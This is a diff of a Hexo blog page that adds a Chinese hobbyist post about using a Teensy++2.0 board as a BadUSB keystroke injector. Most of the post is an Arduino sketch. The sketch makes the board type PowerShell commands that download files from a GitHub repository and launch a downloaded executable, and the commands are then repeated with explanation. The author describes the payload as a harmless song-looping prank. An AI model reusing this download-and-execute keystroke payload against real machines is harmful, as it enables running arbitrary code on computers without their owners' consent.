@@ -5,16 +5,22 @@
   
 
   
-  <title>hello Hexo | Hexo</title>
+  <title>Teensy2.0Test | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="hello Hexo">
-<meta property="og:url" content="http://47.106.74.249/2019/08/11/hello-Hexo/index.html">
+  <meta name="description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： void setup() {   delay(5000);//延迟5000ms，便于调试和电脑处">
+<meta name="keywords" content="C,Embedded">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Teensy2.0Test">
+<meta property="og:url" content="http://47.106.74.249/2019/01/28/Teensy2-0Test/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： void setup() {   delay(5000);//延迟5000ms，便于调试和电脑处">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-11T13:34:21.962Z">
+<meta property="og:image" content="http://47.106.74.249/pic/201901281.png">
+<meta property="og:updated_time" content="2019-01-28T15:43:23.917Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hello Hexo">
+<meta name="twitter:title" content="Teensy2.0Test">
+<meta name="twitter:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： void setup() {   delay(5000);//延迟5000ms，便于调试和电脑处">
+<meta name="twitter:image" content="http://47.106.74.249/pic/201901281.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -61,12 +67,16 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-hello-Hexo" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-Teensy2-0Test" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/08/11/hello-Hexo/" class="article-date">
-  <time datetime="2019-08-11T13:34:21.000Z" itemprop="datePublished">2019-08-11</time>
+    <a href="/2019/01/28/Teensy2-0Test/" class="article-date">
+  <time datetime="2019-01-28T15:23:15.000Z" itemprop="datePublished">2019-01-28</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Embedded/">Embedded</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -75,7 +85,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      hello Hexo
+      Teensy2.0Test
     </h1>
   
 
@@ -83,23 +93,85 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。</p>
+<h2 id="Teensy"><a href="#Teensy" class="headerlink" title="Teensy"></a>Teensy</h2><p>这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。</p>
+<h2 id="Arduino-和-Teensyduino"><a href="#Arduino-和-Teensyduino" class="headerlink" title="Arduino 和 Teensyduino"></a>Arduino 和 Teensyduino</h2><p>自行安装。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>测试环境为Win10，使用powershell。</p>
+<p>使用开发板实现文件自动下载运行。</p>
+<p>写入代码：</p>
+<pre><code>void setup() { 
+
+delay(5000);//延迟5000ms，便于调试和电脑处理
+Keyboard.press(KEY_LEFT_CTRL);//Press Ctrl
+Keyboard.press(KEY_ESC);//Press Esc
+Keyboard.releaseAll();//释放
+delay(500);
+
+delay(5000);
+Keyboard.print(&quot;powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/OnlyMyRailgunTest.wav&apos;, &apos;D:\\OnlyMyRailgunTest.wav&apos;);exit;&quot;);
+
+delay(5000);
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+
+delay(15000);
+Keyboard.press(KEY_LEFT_CTRL);
+Keyboard.press(KEY_ESC);
+Keyboard.releaseAll();
+delay(500);
+
+delay(5000);
+Keyboard.print(&quot;powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/Project1.exe&apos;, &apos;D:\\Project1.exe&apos;);start D:\\Project1.exe;&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+
+
+delay(30000);
+
+}
+
+void loop() {}</code></pre><p>其中这两段话：</p>
+<pre><code>powershell $client = new-object System.Net.WebClient;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/
+OnlyMyRailgunTest.wav&apos;, &apos;D:\\OnlyMyRailgunTest.wav&apos;);
+exit;
+
+powershell $client = new-object System.Net.WebClient;
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$client.DownloadFile(&apos;https://github.com/NanFengx/Teensy/raw/master/Project1.exe&apos;, &apos;D:\\Project1.exe&apos;);
+start D:\\Project1.exe;</code></pre><p>利用powershell从github上下载事先准备好的可执行文件。我自己写了一个小程序，无限播放Only my railgun的片段，因为github上最大只允许25M，playsound又只能播放WAV，又不想弄其它的库函数或者之类的。</p>
+<p>运行效果：</p>
+<p><img src="/pic/201901281.png" alt></p>
+<p>顺便吐槽，国内github速度是真的慢。</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://47.106.74.249/2019/08/11/hello-Hexo/" data-id="cjz9oc5cs0005asoy3kwjjjre" class="article-share-link">Share</a>
+      <a data-url="http://47.106.74.249/2019/01/28/Teensy2-0Test/" data-id="cjz9oc5cu0006asoyhnpal9w9" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Embedded/">Embedded</a></li></ul>
+
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
+    <a href="/2019/08/11/hello-Hexo/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          hello Hexo
+        
+      </div>
+    </a>
   
-    <a href="/2019/01/28/Teensy2-0Test/" id="article-nav-older" class="article-nav-link-wrap">
+  
+    <a href="/2018/07/29/Perfect-Hair-Programming/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Teensy2.0Test</div>
+      <div class="article-nav-title">Perfect Hair Programming</div>
     </a>
   
 </nav>
